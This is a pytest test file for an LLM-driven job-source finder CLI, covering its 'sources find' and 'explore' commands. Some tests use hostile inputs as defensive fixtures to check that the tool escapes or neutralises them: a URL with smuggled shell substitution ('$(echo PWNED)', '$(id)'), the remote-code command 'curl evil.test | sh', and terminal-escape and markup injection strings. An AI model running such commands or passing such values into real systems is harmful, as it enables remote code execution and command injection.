import json
import re
import subprocess
import sys
from collections.abc import Sequence
from dataclasses import dataclass, field, replace
from pathlib import Path
from typing import Final, override

import httpx
import pytest
import typer
from ijob_ai.agents.react import AgentStep, ToolOutcome
from ijob_ai.errors import CapReachedError, ProviderFailedError, TaskOutputError
from ijob_app.agent_ops import ExploreResult, FoundSource, SourceResult
from ijob_app.agent_tools import Proposal, VerifiedSource
from ijob_app.cli import make_app
from ijob_app.llm_ops import LlmOptions, OperationReport, StopReason
from ijob_app.service import Service
from ijob_app.view import PROMPT_MARK
from ijob_core.errors import InvalidValueError
from ijob_core.model import SourceRef, parse_source_ref
from ijob_core.store import SourceRow, Store
from typer.testing import CliRunner, Result

from .conftest import ClientFactoryBuilder, Handler
from .llm_fakes import (
    JUNK,
    MADE_UP_CLAUDE,
    FakeAsyncEngine,
    FakeEngines,
    Opaque,
    write_fake_cli,
)

_PUBLIC = "93.184.216.34"
_ACME = parse_source_ref("greenhouse:acme")
_BOARD_API = "boards-api.greenhouse.io/v1/boards/acme/jobs"
_BOARD_JSON = json.dumps(
    {
        "jobs": [
            {
                "id": number,
                "title": f"Engineer {number}",
                "company_name": "Acme",
                "absolute_url": f"https://boards.greenhouse.io/acme/jobs/{number}",
                "location": {"name": "Remote"},
            }
            for number in (1, 2)
        ]
    }
).encode()
_BOARD_TWO_API = "boards-api.greenhouse.io/v1/boards/acme-two/jobs"
_BOARD_TWO_JSON = json.dumps(
    {
        "jobs": [
            {
                "id": 7,
                "title": "Analyst",
                "company_name": "Acme Two",
                "absolute_url": "https://boards.greenhouse.io/acme-two/jobs/7",
                "location": {"name": "Remote"},
            }
        ]
    }
).encode()
_BOX_CHARACTERS = "╭╮╰╯│─"
_HOSTILE = "[bold red]gone[/] [link=https://evil.example]x[/link]\x1b[2J\x07"
_ANSI = re.compile(r"\x1b\[[0-9;]*m")


def _call(name: str, **args: str) -> str:
    return json.dumps(
        {"next_thought": "look", "next_tool_name": name, "next_tool_args": args}
    )


TRY_GREENHOUSE = _call("try_board", kind="greenhouse", key="acme")
TRY_LEVER = _call("try_board", kind="lever", key="acme")
TRY_SECOND = _call("try_board", kind="greenhouse", key="acme-two")
FINISH = _call("finish")
FIND_ACME = _call("find_source", company="Acme")
FIND_ACME_TWO = _call("find_source", company="Acme Two")
FIND_GLOBEX = _call("find_source", company="Globex")
PROPOSE_ACME = _call("propose", ref="greenhouse:acme", why="lists its openings")
PROPOSE_ACME_TWO = _call("propose", ref="greenhouse:acme-two", why="also lists")
_INSTRUCTION = "Find fintech companies hiring in Tokyo"
_ACME_TWO = parse_source_ref("greenhouse:acme-two")


def _answer(source: str) -> str:
    return json.dumps({"reasoning": "because", "source": source})


def _summary(text: str = "looked around") -> str:
    return json.dumps({"reasoning": "because", "summary": text})


FOUND_RUN = [TRY_GREENHOUSE, FINISH, _answer("greenhouse:acme")]
NOT_FOUND_RUN = [TRY_LEVER, FINISH, _answer("none")]
_PROPOSE_ONE = [
    FIND_ACME,
    TRY_GREENHOUSE,
    FINISH,
    _answer("greenhouse:acme"),
    PROPOSE_ACME,
]
_PROPOSE_TWO = [
    *_PROPOSE_ONE,
    FIND_ACME_TWO,
    TRY_SECOND,
    FINISH,
    _answer("greenhouse:acme-two"),
    PROPOSE_ACME_TWO,
]
EXPLORE_RUN = [*_PROPOSE_TWO, FINISH, _summary()]


class _Web:
    """A mock web keyed by `host/path`, with an open robots.txt."""

    def __init__(self, routes: dict[str, bytes]) -> None:
        self._routes = routes
        self.requested: list[str] = []

    def __call__(self, request: httpx.Request) -> httpx.Response:
        if request.url.path == "/robots.txt":
            return httpx.Response(200, text="User-agent: *\nAllow: /\n")
        key = f"{request.url.host}{request.url.path}"
        self.requested.append(key)
        body = self._routes.get(key)
        if body is None:
            return httpx.Response(404)
        return httpx.Response(
            200, content=body, headers={"Content-Type": "application/json"}
        )


class _FailingEngine(FakeAsyncEngine):
    """An engine whose calls fail at the provider after `ok_calls` answers."""

    def __init__(self, texts: Sequence[str], *, ok_calls: int) -> None:
        super().__init__(texts)
        self._ok_calls = ok_calls

    @override
    async def complete(self, request: Opaque) -> Opaque:
        if len(self.requests) >= self._ok_calls:
            self.requests.append(request)
            msg = "provider down"
            raise RuntimeError(msg)
        return await super().complete(request)


async def _resolve(host: str, port: int) -> Sequence[str]:
    del host, port
    return [_PUBLIC]


@pytest.fixture(autouse=True)
def clean_environment(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    monkeypatch.setenv("HOME", str(tmp_path))
    for name in (
        "LITELLM_MODEL_COST_MAP_URL",
        "OPENROUTER_API_BASE",
        "OPENROUTER_BASE_URL",
    ):
        monkeypatch.delenv(name, raising=False)


@pytest.fixture
def on_a_terminal(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr("ijob_app.view._stdout_is_terminal", lambda: True)
    monkeypatch.setattr("ijob_app.cli_output._stderr_is_terminal", lambda: True)


@dataclass(slots=True)
class _World:
    """One ijob home with a fake model and a mock web."""

    tmp_path: Path
    client_factory_for: ClientFactoryBuilder
    engine: FakeAsyncEngine = field(default_factory=FakeAsyncEngine)
    engines: FakeEngines = field(default_factory=FakeEngines)
    web: _Web = field(default_factory=lambda: _Web({_BOARD_API: _BOARD_JSON}))
    interactive: bool = False
    handler: Handler | None = None

    @property
    def home(self) -> Path:
        return self.tmp_path / "home"

    @property
    def db(self) -> Path:
        return self.tmp_path / "ijob.db"

    def script(self, texts: Sequence[str], *, cost: float = 0.001) -> None:
        self.use(FakeAsyncEngine(texts, cost=cost))

    def use(self, engine: FakeAsyncEngine) -> None:
        self.engine = engine
        self.engines = FakeEngines(engine)

    def configure(
        self,
        *,
        source_agent: str | None = MADE_UP_CLAUDE,
        explore_agent: str | None = MADE_UP_CLAUDE,
        max_cost_usd: float = 0.5,
    ) -> None:
        self.home.mkdir(parents=True, exist_ok=True)
        cli = write_fake_cli(self.tmp_path / "bin")
        lines = ["[models]"]
        if source_agent is not None:
            lines.append(f'source_agent = "{source_agent}"')
        if explore_agent is not None:
            lines.append(f'explore_agent = "{explore_agent}"')
        lines += ["", "[llm]", "concurrency = 1", f"max_cost_usd = {max_cost_usd}"]
        lines += ["", "[providers.claude-sdk]", f'cli_path = "{cli.path}"', ""]
        (self.home / "config.toml").write_text("\n".join(lines), encoding="utf-8")

    def app(self) -> typer.Typer:
        engines = self.engines

        def options(_home: object, config_path: Path) -> LlmOptions:
            return LlmOptions(config_path=config_path, engines=engines)

        return make_app(
            self.client_factory_for(self.handler or self.web),
            llm_options=options,
            is_interactive=lambda: self.interactive,
            resolver=_resolve,
        )

    def find(self, *args: str, stdin: str | None = None) -> Result:
        argv = ["sources", "find", *args, "--db", str(self.db)]
        env = {"IJOB_HOME": str(self.home)}
        return CliRunner().invoke(self.app(), argv, env=env, input=stdin)

    def explore(self, *args: str, stdin: str | None = None) -> Result:
        argv = ["explore", *args, "--db", str(self.db)]
        env = {"IJOB_HOME": str(self.home)}
        return CliRunner().invoke(self.app(), argv, env=env, input=stdin)

    def has(self, ref: SourceRef) -> bool:
        with Store.open(self.db) as store:
            row = store.source(ref)
        return row is not None and not row.removed

    def add_source(self, ref: SourceRef, company: str) -> None:
        with Store.open(self.db) as store:
            store.add_source(ref, company)


@pytest.fixture
def world(tmp_path: Path, client_factory_for: ClientFactoryBuilder) -> _World:
    built = _World(tmp_path, client_factory_for)
    built.script(FOUND_RUN)
    built.configure()
    return built


def _stub_find(  # noqa: PLR0913  # one keyword per thing a run can end in
    monkeypatch: pytest.MonkeyPatch,
    found: FoundSource | None,
    *,
    steps: Sequence[AgentStep] = (),
    stop: Exception | None = None,
    stopped_by: StopReason | None = None,
    could_not_check: Sequence[str] = (),
) -> None:
    async def find_source(
        _self: Service, *_args: object, **_kwargs: object
    ) -> tuple[SourceResult, OperationReport]:
        result = SourceResult(
            verified=[],
            violations=[],
            stop=stop,
            found=found,
            steps=list(steps),
            could_not_check=could_not_check,
        )
        report = OperationReport(
            done=1,
            not_done=0,
            spent=0.004,
            cap=0.5,
            stopped_by=stopped_by,
        )
        return result, report

    monkeypatch.setattr(Service, "find_source", find_source)


def test_find_blank_input_exits_2(world: _World) -> None:
    result = world.find("   ")

    assert result.exit_code == 2
    assert "error: " in result.stderr
    assert world.engine.requests == []


def test_find_url_without_company_exits_2(world: _World) -> None:
    result = world.find("https://acme.test/careers", "--yes")

    assert result.exit_code == 2
    assert "--company" in result.stderr
    assert world.engine.requests == []


def test_find_blank_company_with_a_url_exits_2(world: _World) -> None:
    result = world.find("https://acme.test/careers", "--company", "  ", "--yes")

    assert result.exit_code == 2
    assert world.engine.requests == []


def test_find_name_with_company_exits_2(world: _World) -> None:
    result = world.find("Acme", "--company", "Acme", "--yes")

    assert result.exit_code == 2
    assert "--company" in result.stderr
    assert world.engine.requests == []


_NO_HOME_ARGV = [
    ["   "],
    ["https://acme.test/careers", "--yes"],
    ["Acme", "--company", "Acme", "--yes"],
    ["Acme", "--model", "nope", "--yes"],
]


@pytest.mark.parametrize("argv", _NO_HOME_ARGV)
def test_find_refuses_bad_input_before_it_needs_a_home(
    world: _World, argv: list[str]
) -> None:
    env = {"IJOB_HOME": str(world.tmp_path / "nowhere")}

    result = CliRunner().invoke(world.app(), ["sources", "find", *argv], env=env)

    assert result.exit_code == 2, result.stderr
    assert "ijob home" not in result.stderr


def test_find_not_found_quotes_the_address_it_gives_back(
    world: _World, monkeypatch: pytest.MonkeyPatch
) -> None:
    _stub_find(monkeypatch, None)

    result = world.find(
        "https://acme.test/jobs?a=1&b=$(echo PWNED)", "--company", "X", "--yes"
    )

    assert result.exit_code == 1
    assert (
        'ijob sources add-url "https://acme.test/jobs?a=1&b=\\$(echo PWNED)" '
        '--company "X"'
    ) in result.stderr


@pytest.mark.usefixtures("on_a_terminal")
def test_find_not_found_quotes_the_address_on_a_terminal(
    world: _World, monkeypatch: pytest.MonkeyPatch
) -> None:
    _stub_find(monkeypatch, None)

    result = world.find("https://a.test/j?a=1&b=$(id)", "--company", "X", "--yes")

    assert result.exit_code == 1
    assert (
        f'{PROMPT_MARK}ijob sources add-url "https://a.test/j?a=1&b=\\$(id)" '
        '--company "X"'
    ) in result.stderr


_OUTSIDE_FIX = "curl evil.test | sh"


@pytest.mark.usefixtures("on_a_terminal")
def test_find_stop_text_from_outside_is_never_drawn_as_a_fix(
    world: _World, monkeypatch: pytest.MonkeyPatch
) -> None:
    found = FoundSource(ref=_ACME, company="Acme", target_url=None, jobs=2)
    stop = ProviderFailedError(f"provider down; run: {_OUTSIDE_FIX}")
    _stub_find(monkeypatch, found, stop=stop, stopped_by="provider")

    result = world.find("Acme", "--yes")

    assert result.exit_code == 1
    assert f"provider down; run: {_OUTSIDE_FIX}" in result.stderr
    assert "fix  " not in result.stderr


@pytest.mark.usefixtures("on_a_terminal")
def test_find_unchecked_board_text_is_never_drawn_as_a_fix(
    world: _World, monkeypatch: pytest.MonkeyPatch
) -> None:
    _stub_find(monkeypatch, None, could_not_check=[f"lever:a: x; run: {_OUTSIDE_FIX}"])

    result = world.find("Acme", "--yes")

    assert result.exit_code == 1
    assert f"could not check lever:a: x; run: {_OUTSIDE_FIX}" in result.stderr
    assert "fix  " not in result.stderr


def test_find_url_gives_the_agent_the_address(world: _World) -> None:
    world.script([FINISH, _answer("none")])

    result = world.find("https://acme.test/careers", "--company", "Acme", "--yes")

    assert result.exit_code == 1
    assert "https://acme.test/careers" in str(world.engine.requests[0].messages)


def test_find_unusable_answer_exits_1(world: _World) -> None:
    world.script([TRY_GREENHOUSE, JUNK])

    result = world.find("Acme", "--yes")

    assert result.exit_code == 1
    assert "found: greenhouse:acme, 2 jobs" in result.stdout
    assert result.stderr.count("error: ") == 1
    assert world.has(_ACME)


def test_find_missing_model_exits_1(world: _World) -> None:
    world.configure(source_agent=None)

    result = world.find("Acme", "--yes")

    assert result.exit_code == 1
    assert "[models].source_agent" in result.stderr
    assert world.engine.requests == []


def test_find_bad_model_exits_2(world: _World) -> None:
    result = world.find("Acme", "--model", "nonsense", "--yes")

    assert result.exit_code == 2
    assert "--model" in result.stderr
    assert world.engine.requests == []


def test_find_model_replaces_the_configured_one(world: _World) -> None:
    world.configure(source_agent=None)

    result = world.find("Acme", "--model", "claude-sdk/other-model", "--yes")

    assert result.exit_code == 0, result.stderr
    [(ref, _cli)] = world.engines.calls
    assert str(ref) == "claude-sdk/other-model"


def test_find_pipe_needs_yes(world: _World) -> None:
    result = world.find("Acme")

    assert result.exit_code == 1
    assert result.stdout == ""
    assert result.stderr.splitlines() == ["error: confirmation needed; pass --yes"]
    assert world.engine.requests == []
    assert world.web.requested == []


def test_find_confirm_yes_adds(world: _World) -> None:
    result = world.find("Acme", "--yes")

    assert result.exit_code == 0, result.stderr
    lines = result.stdout.splitlines()
    assert lines[:2] == [
        "found: greenhouse:acme, 2 jobs",
        "step 1: verify greenhouse:acme, 2 jobs, company matches",
    ]
    assert lines[-1] == "added greenhouse:acme"
    assert re.search(r"^cost \$0\.0030 of \$0\.50$", result.stderr, re.MULTILINE)
    assert world.has(_ACME)


def test_find_interactive_accepts(world: _World) -> None:
    world.interactive = True

    result = world.find("Acme", stdin="y\n")

    assert result.exit_code == 0, result.stderr
    assert "Add this source? [y/N] " in result.stdout
    assert result.stdout.splitlines()[-1].endswith("added greenhouse:acme")
    assert world.has(_ACME)


def test_find_declined_exits_1(world: _World) -> None:
    world.interactive = True

    result = world.find("Acme", stdin="n\n")

    assert result.exit_code == 1
    assert result.stdout.splitlines()[-1].endswith("not stored")
    assert not world.has(_ACME)


def test_find_end_of_input_declines(world: _World) -> None:
    world.interactive = True

    result = world.find("Acme", stdin="")

    assert result.exit_code == 1
    assert not world.has(_ACME)


def test_find_known_source_exits_0(world: _World) -> None:
    world.add_source(_ACME, "Acme")
    world.interactive = True

    result = world.find("Acme")

    assert result.exit_code == 0, result.stderr
    assert "greenhouse:acme is already a source" in result.stdout
    assert "[y/N]" not in result.stdout
    assert world.has(_ACME)


def test_find_other_company_exits_2(world: _World) -> None:
    world.add_source(_ACME, "Other Co")

    result = world.find("Acme", "--yes")

    assert result.exit_code == 2
    assert result.stderr.splitlines()[-1] == (
        "error: greenhouse:acme is already a source for Other Co"
    )


def test_find_not_found_exits_1(world: _World) -> None:
    world.script(NOT_FOUND_RUN)

    result = world.find("Acme", "--yes")

    assert result.exit_code == 1
    assert result.stdout == ""
    assert (
        "error: no source found for Acme (1 step, $0.0030); run: "
        'ijob sources add-url <careers URL> --company "Acme"'
    ) in result.stderr
    assert not world.has(_ACME)


def test_find_not_found_names_boards_it_could_not_check(world: _World) -> None:
    world.script(NOT_FOUND_RUN)

    def down(request: httpx.Request) -> httpx.Response:
        msg = "down"
        raise httpx.ConnectTimeout(msg, request=request)

    world.handler = down
    result = world.find("Acme", "--yes")

    assert result.exit_code == 1
    assert "could not check lever:acme" in result.stderr


def test_find_cap_message(world: _World) -> None:
    world.use(FakeAsyncEngine([TRY_GREENHOUSE, TRY_LEVER], cost=0.01))
    world.configure(max_cost_usd=0.015)

    result = world.find("Acme", "--yes")

    assert result.exit_code == 0, result.stderr
    assert "Stopped at the cost cap" in result.stderr
    assert "cost $0.0200 of $0.01" in result.stderr
    assert "[llm].max_cost_usd" in result.stderr
    assert "added greenhouse:acme" in result.stdout


def test_find_cap_with_nothing_verified_is_not_found(world: _World) -> None:
    world.use(FakeAsyncEngine([TRY_LEVER], cost=0.01))
    world.configure(max_cost_usd=0.015)

    result = world.find("Acme", "--yes")

    assert result.exit_code == 1
    assert "Stopped at the cost cap" in result.stderr
    assert "ijob sources add-url" in result.stderr


def test_find_provider_failure_exits_1(world: _World) -> None:
    world.use(_FailingEngine([TRY_GREENHOUSE], ok_calls=1))

    result = world.find("Acme", "--yes")

    assert result.exit_code == 1
    assert "found: greenhouse:acme" in result.stdout
    assert "error: " in result.stderr
    assert "added greenhouse:acme" in result.stdout


def test_find_provider_failure_still_asks_before_adding(world: _World) -> None:
    world.use(_FailingEngine([TRY_GREENHOUSE], ok_calls=1))
    world.interactive = True

    result = world.find("Acme", stdin="n\n")

    assert result.exit_code == 1
    assert "found: greenhouse:acme" in result.stdout
    assert not world.has(_ACME)


def test_find_pipe_output_is_plain(world: _World) -> None:
    result = world.find("Acme", "--yes")

    assert not any(char in result.stdout for char in _BOX_CHARACTERS)
    assert not any(char in result.stderr for char in _BOX_CHARACTERS)
    assert "\x1b" not in result.output


@pytest.mark.usefixtures("on_a_terminal")
def test_find_draws_third_party_text_literally(
    world: _World, monkeypatch: pytest.MonkeyPatch
) -> None:
    found = FoundSource(
        ref=_ACME,
        company="Acme",
        target_url=f"https://acme.test/{_HOSTILE}",
        jobs=2,
        sample=(_HOSTILE,),
    )
    stop = ProviderFailedError(f"boom; run: {_HOSTILE}")
    _stub_find(
        monkeypatch,
        found,
        steps=[AgentStep("try_board", ToolOutcome.OK)],
        stop=stop,
        stopped_by="provider",
    )

    result = world.find("Acme", "--yes")

    assert result.exit_code == 1
    assert "[bold red]gone[/]" in result.stdout
    assert "[link=https://evil.example]x[/link]" in result.stdout
    assert "\x1b" not in result.output
    assert "\x07" not in result.output


@pytest.mark.usefixtures("on_a_terminal")
def test_find_draws_a_panel_on_a_terminal(world: _World) -> None:
    result = world.find("Acme", "--yes")

    assert result.exit_code == 0, result.stderr
    assert "Found · greenhouse:acme" in result.stdout
    assert "STEP" in result.stdout
    assert "verify greenhouse:acme" in result.stdout
    assert "✓ 2 jobs, company matches" in result.stdout
    assert "Sample: Engineer 1 · Engineer 2" in result.stdout
    assert " ✓ Added greenhouse:acme  2 jobs on the next fetch" in result.stdout


@pytest.mark.usefixtures("on_a_terminal")
def test_find_asks_and_reports_the_cost_on_a_terminal(world: _World) -> None:
    world.interactive = True

    result = world.find("Acme", stdin="y\n")

    assert result.exit_code == 0, result.stderr
    assert " Add this source?   y yes   n no" in result.stdout
    assert "   cost $0.0030 of $0.50" in result.stderr


@pytest.mark.usefixtures("on_a_terminal")
def test_find_not_found_draws_the_fix_on_a_terminal(world: _World) -> None:
    world.script(NOT_FOUND_RUN)

    result = world.find("Acme", "--yes")

    assert result.exit_code == 1
    assert result.stderr.splitlines()[-2:] == [
        " ✗ No source found for Acme  1 step, $0.003",
        f' {PROMPT_MARK}ijob sources add-url <careers URL> --company "Acme"',
    ]
    assert "error:" not in result.stderr


def test_find_unusable_answer_error_is_one_clean_line(
    world: _World, monkeypatch: pytest.MonkeyPatch
) -> None:
    found = FoundSource(ref=_ACME, company="Acme", target_url=None, jobs=2)
    _stub_find(
        monkeypatch, found, stop=TaskOutputError("source_agent", f"bad {_HOSTILE}")
    )

    result = world.find("Acme", "--yes")

    assert result.exit_code == 1
    assert "\x1b" not in result.stderr
    assert "\x07" not in result.stderr


def test_find_cap_stub_reports_the_cap_without_failing(
    world: _World, monkeypatch: pytest.MonkeyPatch
) -> None:
    found = FoundSource(ref=_ACME, company="Acme", target_url=None, jobs=2)
    _stub_find(monkeypatch, found, stop=CapReachedError(), stopped_by="cap")

    result = world.find("Acme", "--yes")

    assert result.exit_code == 0, result.stderr
    assert "Stopped at the cost cap" in result.stderr


def test_find_help_lists_the_flags(world: _World) -> None:
    result = CliRunner().invoke(world.app(), ["sources", "find", "--help"])

    text = _ANSI.sub("", result.output)
    assert result.exit_code == 0
    for flag in ("--company", "--model", "--yes", "--db", "--config"):
        assert flag in text


@pytest.fixture
def explore_world(world: _World) -> _World:
    world.web = _Web(
        {_BOARD_API: _BOARD_JSON, _BOARD_TWO_API: _BOARD_TWO_JSON},
    )
    world.script(EXPLORE_RUN)
    return world


def _stub_explore(
    monkeypatch: pytest.MonkeyPatch,
    result: ExploreResult,
    stopped_by: StopReason | None = None,
) -> None:
    async def explore(
        _self: Service, *_args: object, **_kwargs: object
    ) -> tuple[ExploreResult, OperationReport]:
        report = OperationReport(
            done=1, not_done=0, spent=0.05, cap=0.5, stopped_by=stopped_by
        )
        return result, report

    monkeypatch.setattr(Service, "explore", explore)


def _proposal(
    ref: str = "greenhouse:acme", company: str = "Acme", why: str = "x"
) -> Proposal:
    source = VerifiedSource(ref=parse_source_ref(ref), target_url=None, jobs=2)
    return Proposal(source, company, why)


def _explored(
    *proposals: Proposal, known: int = 0, no_source: int = 0
) -> ExploreResult:
    return ExploreResult(
        proposals=list(proposals),
        known=[parse_source_ref(f"lever:known{n}") for n in range(known)],
        no_source=[f"Nobody {n}" for n in range(no_source)],
        violations=[],
        stop=None,
        steps=[],
    )


def test_explore_blank_exits_2(explore_world: _World) -> None:
    result = explore_world.explore("   ", "--yes")

    assert result.exit_code == 2
    assert "error: " in result.stderr
    assert explore_world.engine.requests == []


def test_explore_over_limit_exits_2(explore_world: _World) -> None:
    result = explore_world.explore("x" * 4_001, "--yes")

    assert result.exit_code == 2
    assert "4,000" in result.stderr
    assert explore_world.engine.requests == []


def test_explore_exactly_the_limit_runs(explore_world: _World) -> None:
    explore_world.script([FINISH, _summary()])

    result = explore_world.explore("x" * 4_000, "--yes")

    assert result.exit_code == 0, result.stderr


def test_explore_missing_model_exits_1(explore_world: _World) -> None:
    explore_world.configure(explore_agent=None)

    result = explore_world.explore(_INSTRUCTION, "--yes")

    assert result.exit_code == 1
    assert "[models].explore_agent" in result.stderr
    assert explore_world.engine.requests == []


def test_explore_bad_model_exits_2(explore_world: _World) -> None:
    result = explore_world.explore(_INSTRUCTION, "--model", "nonsense", "--yes")

    assert result.exit_code == 2
    assert "--model" in result.stderr
    assert explore_world.engine.requests == []


def test_explore_model_replaces_the_configured_one(explore_world: _World) -> None:
    explore_world.configure(explore_agent=None)

    result = explore_world.explore(
        _INSTRUCTION, "--model", "claude-sdk/other-model", "--yes"
    )

    assert result.exit_code == 0, result.stderr
    assert str(explore_world.engines.calls[0][0]) == "claude-sdk/other-model"


def test_explore_pipe_needs_yes(explore_world: _World) -> None:
    result = explore_world.explore(_INSTRUCTION)

    assert result.exit_code == 1
    assert result.stdout == ""
    assert result.stderr.splitlines() == ["error: confirmation needed; pass --yes"]
    assert explore_world.engine.requests == []
    assert explore_world.web.requested == []


def test_explore_yes_adds_every_proposal(explore_world: _World) -> None:
    result = explore_world.explore(_INSTRUCTION, "--yes")

    assert result.exit_code == 0, result.stderr
    lines = result.stdout.splitlines()
    assert lines[:3] == [
        "2 sources proposed",
        "1: greenhouse:acme, Acme, 2 jobs, lists its openings",
        "2: greenhouse:acme-two, Acme Two, 1 job, also lists",
    ]
    assert lines[-1] == "added greenhouse:acme, greenhouse:acme-two"
    assert "Add which?" not in result.stdout
    assert explore_world.has(_ACME)
    assert explore_world.has(_ACME_TWO)
    assert re.search(r"^cost \$[\d.]+ of \$0\.50$", result.stderr, re.MULTILINE)


def test_explore_pick_numbers(explore_world: _World) -> None:
    explore_world.interactive = True

    result = explore_world.explore(_INSTRUCTION, stdin="2\n")

    assert result.exit_code == 0, result.stderr
    assert "Add which?" in result.stdout
    assert not explore_world.has(_ACME)
    assert explore_world.has(_ACME_TWO)


def test_explore_pick_two_numbers(explore_world: _World) -> None:
    explore_world.interactive = True

    result = explore_world.explore(_INSTRUCTION, stdin="1, 2\n")

    assert result.exit_code == 0, result.stderr
    assert explore_world.has(_ACME)
    assert explore_world.has(_ACME_TWO)


@pytest.mark.parametrize(
    ("answer", "added"),
    [("all\n", 2), ("ALL\n", 2), ("none\n", 0), ("\n", 0)],
)
def test_explore_pick_all_and_none(
    explore_world: _World, answer: str, added: int
) -> None:
    explore_world.interactive = True

    result = explore_world.explore(_INSTRUCTION, stdin=answer)

    assert result.exit_code == 0, result.stderr
    assert explore_world.has(_ACME) is (added == 2)
    assert explore_world.has(_ACME_TWO) is (added == 2)
    assert ("not stored" in result.stdout) is (added == 0)


def test_explore_invalid_pick_asks_again(explore_world: _World) -> None:
    explore_world.interactive = True

    result = explore_world.explore(_INSTRUCTION, stdin="9\nabc\n0\n1,x\n1\n")

    assert result.exit_code == 0, result.stderr
    assert result.stdout.count("Add which?") == 5
    assert result.stderr.count("error: ") == 4
    assert explore_world.has(_ACME)
    assert not explore_world.has(_ACME_TWO)


def test_explore_end_of_input_means_none(explore_world: _World) -> None:
    explore_world.interactive = True

    result = explore_world.explore(_INSTRUCTION, stdin="")

    assert result.exit_code == 0, result.stderr
    assert not explore_world.has(_ACME)
    assert not explore_world.has(_ACME_TWO)


def test_explore_end_of_input_after_a_bad_pick_means_none(
    explore_world: _World,
) -> None:
    explore_world.interactive = True

    result = explore_world.explore(_INSTRUCTION, stdin="abc\n")

    assert result.exit_code == 0, result.stderr
    assert not explore_world.has(_ACME)


def test_explore_failed_add_continues_and_exits_1(
    explore_world: _World, monkeypatch: pytest.MonkeyPatch
) -> None:
    original = Service.add_found

    async def add_found(self: Service, found: FoundSource) -> SourceRow:
        if found.ref == _ACME:
            msg = "the board went away"
            raise InvalidValueError("source", msg)
        return await original(self, found)

    monkeypatch.setattr(Service, "add_found", add_found)

    result = explore_world.explore(_INSTRUCTION, "--yes")

    assert result.exit_code == 1
    assert "greenhouse:acme" in result.stderr
    assert "the board went away" in result.stderr
    assert result.stdout.splitlines()[-1] == "added greenhouse:acme-two"
    assert not explore_world.has(_ACME)
    assert explore_world.has(_ACME_TWO)


@pytest.mark.usefixtures("on_a_terminal")
def test_explore_failed_add_text_from_outside_is_never_drawn_as_a_fix(
    explore_world: _World, monkeypatch: pytest.MonkeyPatch
) -> None:
    async def add_found(_self: Service, _found: FoundSource) -> SourceRow:
        msg = f"nope; run: {_OUTSIDE_FIX}"
        raise InvalidValueError("source", msg)

    monkeypatch.setattr(Service, "add_found", add_found)

    result = explore_world.explore(_INSTRUCTION, "--yes")

    assert result.exit_code == 1
    assert f"nope; run: {_OUTSIDE_FIX}" in result.stderr
    assert "fix  " not in result.stderr


def test_explore_a_pick_of_thousands_of_digits_asks_again(
    explore_world: _World,
) -> None:
    explore_world.interactive = True

    result = explore_world.explore(_INSTRUCTION, stdin=f"{'9' * 5000}\n1\n")

    assert result.exit_code == 0, result.stderr
    assert result.stderr.count("error: ") == 1
    assert explore_world.has(_ACME)
    assert not explore_world.has(_ACME_TWO)


_BLANK_EXPLORE: Final = """\
import sys
from ijob_app.cli import make_app
from typer.testing import CliRunner


def refuse(cache):
    raise AssertionError("a blank instruction made a request")


result = CliRunner().invoke(make_app(refuse), ["explore", "   "])
print(result.exit_code)
print("dspy" in sys.modules or "claude_agent_sdk" in sys.modules)
"""


def test_explore_blank_instruction_loads_no_llm_library() -> None:
    run = subprocess.run(  # noqa: S603 - fixed argv built from this interpreter
        [sys.executable, "-I", "-c", _BLANK_EXPLORE],
        capture_output=True,
        text=True,
        check=False,
    )

    assert run.returncode == 0, run.stderr
    assert run.stdout.splitlines()[-2:] == ["2", "False"]


def test_explore_no_proposals_exits_0(explore_world: _World) -> None:
    explore_world.script([FINISH, _summary()])
    explore_world.interactive = True

    result = explore_world.explore(_INSTRUCTION)

    assert result.exit_code == 0, result.stderr
    assert result.stdout.splitlines() == ["no sources proposed"]


def test_explore_counts_known_sources_and_companies_without_one(
    explore_world: _World,
) -> None:
    explore_world.add_source(_ACME, "Acme")
    explore_world.script(
        [
            FIND_ACME,
            TRY_GREENHOUSE,
            FINISH,
            _answer("greenhouse:acme"),
            PROPOSE_ACME,
            FIND_GLOBEX,
            TRY_LEVER,
            FINISH,
            _answer("none"),
            FINISH,
            _summary(),
        ]
    )

    result = explore_world.explore(_INSTRUCTION, "--yes")

    assert result.exit_code == 0, result.stderr
    assert result.stdout.splitlines() == [
        "no sources proposed, 1 already known, 1 no source"
    ]


def test_explore_cap_exits_0_with_the_proposals(explore_world: _World) -> None:
    explore_world.use(FakeAsyncEngine([*_PROPOSE_ONE, FIND_GLOBEX], cost=0.01))
    explore_world.configure(max_cost_usd=0.045)

    result = explore_world.explore(_INSTRUCTION, "--yes")

    assert result.exit_code == 0, result.stderr
    assert "Stopped at the cost cap" in result.stderr
    assert "[llm].max_cost_usd" in result.stderr
    assert result.stdout.splitlines()[0] == "1 source proposed"
    assert explore_world.has(_ACME)


def test_explore_provider_failure_exits_1_with_the_proposals(
    explore_world: _World,
) -> None:
    explore_world.use(_FailingEngine(_PROPOSE_ONE, ok_calls=5))

    result = explore_world.explore(_INSTRUCTION, "--yes")

    assert result.exit_code == 1
    assert result.stderr.count("error: ") == 1
    assert result.stdout.splitlines()[0] == "1 source proposed"
    assert explore_world.has(_ACME)


def test_explore_unusable_answer_exits_1(explore_world: _World) -> None:
    explore_world.script([*_PROPOSE_ONE, JUNK])

    result = explore_world.explore(_INSTRUCTION, "--yes")

    assert result.exit_code == 1
    assert result.stderr.count("error: ") == 1
    assert result.stdout.splitlines()[0] == "1 source proposed"
    assert explore_world.has(_ACME)


def test_explore_provider_failure_still_asks_before_adding(
    explore_world: _World,
) -> None:
    explore_world.use(_FailingEngine(_PROPOSE_ONE, ok_calls=5))
    explore_world.interactive = True

    result = explore_world.explore(_INSTRUCTION, stdin="none\n")

    assert result.exit_code == 1
    assert "Add which?" in result.stdout
    assert not explore_world.has(_ACME)


def test_explore_pipe_output_is_plain(explore_world: _World) -> None:
    result = explore_world.explore(_INSTRUCTION, "--yes")

    assert not any(char in result.stdout for char in _BOX_CHARACTERS)
    assert not any(char in result.stderr for char in _BOX_CHARACTERS)
    assert "\x1b" not in result.output


@pytest.mark.usefixtures("on_a_terminal")
def test_explore_draws_a_panel_on_a_terminal(explore_world: _World) -> None:
    result = explore_world.explore(_INSTRUCTION, "--yes")

    assert result.exit_code == 0, result.stderr
    assert "   ✓ checked Acme  greenhouse, 2 jobs" in result.stdout
    assert "╭─ 2 sources proposed " in result.stdout
    for column in ("#", "SOURCE", "COMPANY", "JOBS", "WHY"):
        assert column in result.stdout
    assert "greenhouse:acme-two" in result.stdout
